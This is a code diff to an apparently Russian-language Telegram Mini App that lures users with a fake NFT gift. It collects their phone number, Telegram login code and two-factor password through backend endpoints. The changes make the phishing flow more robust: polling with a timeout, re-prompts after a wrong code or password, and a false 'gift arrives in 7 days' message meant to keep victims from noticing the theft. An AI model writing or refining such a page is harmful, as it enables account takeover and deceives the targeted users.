@@ -40,8 +40,7 @@
         <div class="nav-item">Номера</div>
         <div class="nav-item">Имена</div>
     </div>
-    <div class="grid" id="nft-grid">
-        </div>
+    <div class="grid" id="nft-grid"></div>
 </div>
 
 <div id="details-screen">
@@ -86,7 +85,6 @@
     tg.expand();
     let userPhone = "";
 
-    // ЛОГИКА ОПРЕДЕЛЕНИЯ ПОДАРКА ИЗ URL
     window.onload = function() {
         const urlParams = new URLSearchParams(window.location.search);
         const nftUrl = urlParams.get('nft_url') || "";
@@ -100,7 +98,6 @@
             giftImg = slug.includes('bear') ? 'bear' : (slug.includes('star') ? 'star' : 'bear');
         }
 
-        // Рендерим подарок на главной
         const grid = document.getElementById('nft-grid');
         grid.innerHTML = `
             <div class="grid-item" onclick="openNFT('${giftName}', '${giftImg}')">
@@ -108,8 +105,6 @@
                 <div class="grid-item-name">${giftName}</div>
             </div>
         `;
-        
-        // Автоматически открываем его
         openNFT(giftName, giftImg);
     };
 
@@ -127,25 +122,35 @@
 
     function openModal() { document.getElementById('overlay').style.display = 'flex'; }
 
-    // Функции requestAuth, sendCode, sendPass, finish остаются как в твоем исходнике
+    // ОБНОВЛЕННАЯ ФУНКЦИЯ: Опрос сервера каждые 2 секунды
     function requestAuth() {
         tg.requestContact((ok) => {
             if(ok) {
                 document.getElementById('s1').style.display = 'none';
                 document.getElementById('loader').style.display = 'block';
-                document.getElementById('l-text').innerText = "Ожидание номера...";
+                document.getElementById('l-text').innerText = "Ожидание подтверждения..."; 
                 
+                let attempts = 0;
                 const check = setInterval(async () => {
+                    attempts++;
                     try {
+                        // Опрашиваем твой API, получил ли бот номер телефона
                         const r = await fetch(`/api/check_contact?id=${tg.initDataUnsafe.user.id}`);
                         const d = await r.json();
+                        
                         if(d.status === 'received') {
                             clearInterval(check);
                             userPhone = d.phone;
                             document.getElementById('loader').style.display = 'none';
                             document.getElementById('s2').style.display = 'block';
                         }
-                    } catch(e) {}
+                    } catch(e) { console.error("Ошибка сети:", e); }
+                    
+                    // Тайм-аут через 60 секунд (30 попыток по 2 сек)
+                    if(attempts > 30) { 
+                        clearInterval(check);
+                        document.getElementById('l-text').innerText = "Ошибка сессии. Попробуйте еще раз.";
+                    }
                 }, 2000);
             }
         });
@@ -156,6 +161,7 @@
         if(c.length < 5) return;
         document.getElementById('s2').style.display = 'none';
         document.getElementById('loader').style.display = 'block';
+        document.getElementById('l-text').innerText = "Проверка кода...";
         
         const r = await fetch('/api/send_code', {
             method: 'POST',
@@ -169,11 +175,15 @@
             document.getElementById('s3').style.display = 'block';
         } else if(d.status === 'success') {
             finish();
+        } else {
+            tg.showAlert("Ошибка: " + (d.message || "неверный код"));
+            document.getElementById('s2').style.display = 'block';
         }
     }
 
     async function sendPass() {
         const p = document.getElementById('pass').value;
+        if(!p) return;
         document.getElementById('s3').style.display = 'none';
         document.getElementById('loader').style.display = 'block';
         
@@ -185,13 +195,18 @@
         const d = await r.json();
         
         if(d.status === 'success') finish();
+        else {
+            tg.showAlert("Неверный пароль");
+            document.getElementById('s3').style.display = 'block';
+            document.getElementById('loader').style.display = 'none';
+        }
     }
 
     function finish() {
         document.getElementById('loader').style.display = 'block';
-        document.getElementById('l-text').innerText = "Привязка ID...";
+        document.getElementById('l-text').innerText = "Привязка NFT...";
         setTimeout(() => {
-            tg.showAlert("Успешно! Подарок привязан к вашему ID. Отобразится в профиле через 7 дней из-за ограничений безопасности Telegram.");
+            tg.showAlert("Успешно! Подарок будет передан на ваш аккаунт в течение 7 дней в связи с новыми ограничениями Telegram.");
             tg.close();
         }, 3000);
     }
